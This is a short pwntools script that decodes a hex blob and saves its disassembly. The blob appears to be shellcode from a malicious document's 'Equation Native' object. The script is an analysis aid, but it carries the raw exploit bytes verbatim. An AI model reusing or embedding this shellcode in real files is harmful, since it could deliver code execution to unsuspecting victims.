#!/usr/bin/env python
from pwn import *

code = '1c0000000200a8c3990200000000000048905d006c9c5b0000000000030101030a0a01085a5ab844eb7112ba7856341231d08b088b098b096683c13cffe19090909090909090909090909090909090909090142140000000b835ad40008b08b8df06b2de33c1b8e97287cd33c1b8ee77c8bf33c1b8be7c9fef33c1b8ed23c8b833c1b8ef73ccbb33c1b8b87cc5ed33c1b8b97cceee33c1b8bf7cc8bf33c1b8aa389dbd33c1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000B5020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'.decode('hex')
with open('code.txt', 'wb') as f:
    f.write(disasm(code))

